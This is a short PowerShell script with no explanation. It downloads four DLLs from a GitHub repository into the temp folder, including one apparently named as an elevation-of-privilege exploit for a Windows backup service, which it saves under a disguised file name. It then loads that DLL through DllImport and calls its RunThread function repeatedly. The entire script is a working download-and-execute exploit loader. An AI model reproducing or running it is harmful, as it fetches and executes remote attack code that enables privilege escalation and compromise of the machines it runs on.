$path = $Env:temp+'\ucrtbased.dll'; $client = New-Object System.Net.WebClient; $client.downloadfile('https://github.com/beautifulpenis/foreskin/raw/main/ucrtbased.dll',$path);
$path = $Env:temp+'\vcruntime140d.dll'; $client = New-Object System.Net.WebClient; $client.downloadfile('https://github.com/beautifulpenis/foreskin/raw/main/vcruntime140d.dll',$path);
$path = $Env:temp+'\vcruntime140_1d.dll'; $client = New-Object System.Net.WebClient; $client.downloadfile('https://github.com/beautifulpenis/foreskin/raw/main/vcruntime140_1d.dll',$path);
$path = $Env:temp+'\usrbup.dll'; $client = New-Object System.Net.WebClient; $client.downloadfile('https://github.com/beautifulpenis/foreskin/raw/main/SDRsvcEop.dll',$path);

$signature = @"
[DllImport(@"$path")]
public static extern void RunThread();
"@;

$type = Add-Type -MemberDefinition $signature -Name Win32Utils -Namespace usrbup -PassThru;
for (($i = 0), ($j = 0); $i -lt 10; $i++)
{
	clear;
	$type::RunThread();
	Start-Sleep -Seconds 5
}
